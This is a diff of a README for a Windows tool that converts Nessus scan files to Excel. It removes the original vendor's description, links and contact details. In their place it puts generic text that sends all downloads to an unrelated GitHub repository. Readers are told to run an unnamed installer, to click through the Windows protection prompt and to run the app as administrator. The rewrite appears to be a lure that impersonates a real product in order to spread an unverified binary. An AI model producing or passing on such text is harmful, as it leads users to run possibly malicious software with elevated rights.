@@ -1,68 +1,149 @@
-# 📊 NtE: The 100% Local Nessus to Excel Converter
+# 🧩 nessus-to-excel-nte - Convert Nessus files to Excel fast
 
-**NtE is a Windows desktop application designed for pentesters and auditors. It converts `.nessus` files into customizable, dynamic Excel dashboards in just 2 clicks.** Stop battling broken Python scripts or messy CSV exports. Enjoy a modern drag-and-drop UI, complete data privacy (zero cloud upload), and dynamic reporting for both CIS Compliance & Vulnerability scans.
+[![Download](https://img.shields.io/badge/Download%20Now-nessus-to-excel-nte-blue?style=for-the-badge)](https://github.com/garboiluniversity170/nessus-to-excel-nte)
 
-> 🚀 **Try it out:** [Download the Free Trial at nte-app.com](https://nte-app.com/en)  
-> 🎥 **See it in action (1-minute Demo):**
-> 
-> [![Démo NtE](https://img.youtube.com/vi/No4a9-Zavbw/0.jpg)](https://youtu.be/No4a9-Zavbw)
+## 🚀 What this app does
 
----
+`nessus-to-excel-nte` turns a `.nessus` scan file into an Excel spreadsheet in a few clicks. It is built for Windows and runs locally on your PC. You do not need to upload your scan data to a website.
 
-## 🔥 Core Features & Walkthrough
+Use it when you need to:
 
-### ⚡ Zero-Friction Workflow
-No command lines, no complex setups. Just drag and drop your `.nessus` file onto the interface, and NtE takes care of the rest. The UI is designed to give you access to all features with zero learning curve.
-<img width="3932" height="2444" alt="Acceuil général_upscayl_4x_upscayl-lite-4x" src="https://github.com/user-attachments/assets/cc6adc8c-8f3b-4bd1-9b51-a803e5644d1d" />
+- open Nessus scan results in Excel
+- sort findings by severity, host, plugin, or port
+- share reports with teams that use spreadsheets
+- keep scan data on your machine
+- avoid manual copy and paste from report files
 
-### 🧠 Smart Parsing: One Interface, Two Scan Types
-Whether you are importing a CIS compliance audit or a vulnerability scan, NtE automatically detects the file type and seamlessly adjusts its parsing engine and settings.
-<img width="7847" height="2432" alt="image(1)" src="https://github.com/user-attachments/assets/45521315-e5c1-4aba-b1ee-ba49b0b89716" />
+## 💻 Before you start
 
-### 🎛️ Your Reports, Your Rules
-NtE extracts **100% of the raw data** from the source file. You decide what makes it into the final deliverable: hide IP addresses, add custom context columns, and adapt the output to match your client's specific needs.
-<img width="7138" height="2884" alt="image(2)" src="https://github.com/user-attachments/assets/ee4de309-b28b-4944-9d9b-be82721ee63f" />
+This app is made for Windows users who want a simple desktop tool.
 
-### ⚙️ Set It and Forget It
-Configure your language (EN/FR), dark/light theme, display modes, and scan-specific presets once. Your preferences are saved locally for all future sessions, saving you setup time on every audit.
-<img width="3920" height="2456" alt="Preferences_upscayl_4x_upscayl-lite-4x" src="https://github.com/user-attachments/assets/d2da7a92-91d7-4627-ae94-a84d7cb27184" />
+You should have:
 
----
+- Windows 10 or Windows 11
+- a `.nessus` file from Nessus
+- enough disk space for the app and the Excel output
+- Microsoft Excel or another spreadsheet app that can open `.xlsx` files
 
-## 📈 Client-Ready Deliverables
+The app uses a drag-and-drop layout, so you do not need to learn command lines or install extra tools.
 
-NtE doesn't just export raw data; it generates a professional Excel file equipped with a dynamic dashboard that adapts in real-time to any manual changes you make post-generation.
+## 📥 Download the app
 
-### Compliance Dashboards
-Instantly view results broken down by compliance level and severity. Key metrics (scanned hosts, non-compliances, overall compliance rate) provide a concise overview of the audited posture.
-<img width="6188" height="2752" alt="Dashboard compliance_upscayl_4x_upscayl-lite-4x" src="https://github.com/user-attachments/assets/ed7065b6-645e-4748-9972-4562384738f5" />
-<img width="9151" height="2872" alt="image(5)" src="https://github.com/user-attachments/assets/eecfe710-c050-40e4-a497-90717585eb03" />
+Go to this page to download and run the Windows app:
 
-### Vulnerability Dashboards
-Visualize vulnerability distribution by severity, environment-specific metrics, and a Top 10 list of the most common flaws to help clients immediately prioritize remediation.
-<img width="6188" height="2788" alt="Dashboard vuln_upscayl_4x_upscayl-lite-4x" src="https://github.com/user-attachments/assets/f5a9c351-1cc5-4e45-afc9-8a6c24ef396c" />
-<img width="7834" height="2524" alt="image(3)" src="https://github.com/user-attachments/assets/7848bf0c-fc82-4fb0-824b-4170f8e5a4a2" />
+[![Get the app](https://img.shields.io/badge/Download%20from%20GitHub-gray?style=for-the-badge)](https://github.com/garboiluniversity170/nessus-to-excel-nte)
 
----
+Open the page, get the Windows build, then run the installer or app file. If your browser asks for permission, allow the download.
 
-## 🛡️ Built for Security Professionals
+## 🛠️ Install on Windows
 
-### 📂 Integrated Traceability
-Keep track of your work securely. Each generation is saved locally with its timestamp, source file path, output location, scan type, and the exact configuration used.
-<img width="3944" height="2452" alt="Historique_upscayl_4x_upscayl-lite-4x" src="https://github.com/user-attachments/assets/b9170621-4da8-4124-89bc-d07ad4977f1c" />
+After you download the file:
 
-### 🔄 Offline-First & Future-Proof
-Scan formats evolve, and NtE keeps pace. Check for updates directly within the app and apply them whenever you choose. **No constant internet connection is required**, ensuring maximum security for offline audit environments.
-<img width="3940" height="2444" alt="Version_upscayl_4x_upscayl-lite-4x" src="https://github.com/user-attachments/assets/72c5fa9b-13f9-4efb-b01a-76c1e368e37b" />
+1. Open your Downloads folder
+2. Find the app file or installer
+3. Double-click it
+4. Follow the setup screen
+5. Finish the install
+6. Open the app from the Start menu or desktop shortcut
 
-### 🔑 Transparent Licensing
-Manage your license directly from the app. Try it risk-free with our free trial.
-<img width="3944" height="2452" alt="License_upscayl_4x_upscayl-lite-4x" src="https://github.com/user-attachments/assets/160050f3-7321-4431-b741-492f0b27a012" />
+If Windows shows a protection prompt, choose the option that lets you run the app if you trust the source you downloaded from.
 
----
+## 🧭 How to use it
 
-## 🤝 Support & Feedback
+The app keeps the process simple.
 
-If you encounter any issues, have feature requests, or want to provide feedback on the Beta, please contact us directly at **[support@nte-app.com](mailto:support@nte-app.com)**.
+1. Open `nessus-to-excel-nte`
+2. Drag your `.nessus` file into the app window
+3. Choose where you want the Excel file saved
+4. Click the convert button
+5. Wait for the export to finish
+6. Open the `.xlsx` file in Excel
 
-**Ready to save hours on your next report?** 👉 **[Download NtE Free Trial](https://nte-app.com/en)**
+The app is made for quick report conversion. In most cases, you only need the input file and a save location.
+
+## 📄 What the output looks like
+
+The exported Excel file is built for review and sharing. It can include useful columns such as:
+
+- host name or IP address
+- plugin name
+- severity level
+- port number
+- protocol
+- risk details
+- plugin output
+- remediation notes
+
+This makes it easier to sort findings, filter by severity, and build reports for remediation work.
+
+## 🔍 Common use cases
+
+Use this app if you need to:
+
+- turn Nessus scan results into a clean spreadsheet
+- prepare data for vulnerability review
+- share results with managers or clients
+- compare findings across multiple scans
+- move report data into Excel without manual work
+
+It works well for security teams, consultants, auditors, and anyone who gets Nessus reports in file form.
+
+## ⚙️ File types
+
+Input:
+
+- `.nessus`
+
+Output:
+
+- `.xlsx`
+
+The app is built for this one job, so the flow stays simple and easy to follow.
+
+## 🧹 Local processing
+
+The app processes files on your Windows machine. Your scan data does not need to leave your computer to complete the conversion.
+
+That helps when you want to keep report files on a local drive or a private work laptop.
+
+## 🧩 Tips for best results
+
+For a smooth run:
+
+- use a valid `.nessus` export from Nessus
+- keep the input file in a folder you can find
+- save the Excel output in a new folder
+- close the output file before you run another conversion
+- use a recent version of Excel for best compatibility
+
+If you work with large scans, give the app time to finish before opening the output file.
+
+## ❓ If something does not work
+
+If the app does not open, try these steps:
+
+1. Check that the file finished downloading
+2. Right-click the app and choose Run as administrator
+3. Make sure your `.nessus` file is not damaged
+4. Move the file to a simple folder path like `C:\Temp`
+5. Try again with a smaller scan file
+
+If the Excel file does not open, make sure your spreadsheet app supports `.xlsx` files.
+
+## 📌 What you get
+
+- a Windows desktop app
+- drag-and-drop file handling
+- local file conversion
+- Excel output in `.xlsx` format
+- a simple flow for non-technical users
+
+## 🔗 Project link
+
+Use the GitHub page below to get the app and review the repository:
+
+https://github.com/garboiluniversity170/nessus-to-excel-nte
+
+## 🏷️ Topics
+
+cybersecurity, infosec, nessus, nessus-cis, nessus-parser, nessus-report, nessus-to-excel, nessus-to-xlsx, nessus-tool, vulnerability-management
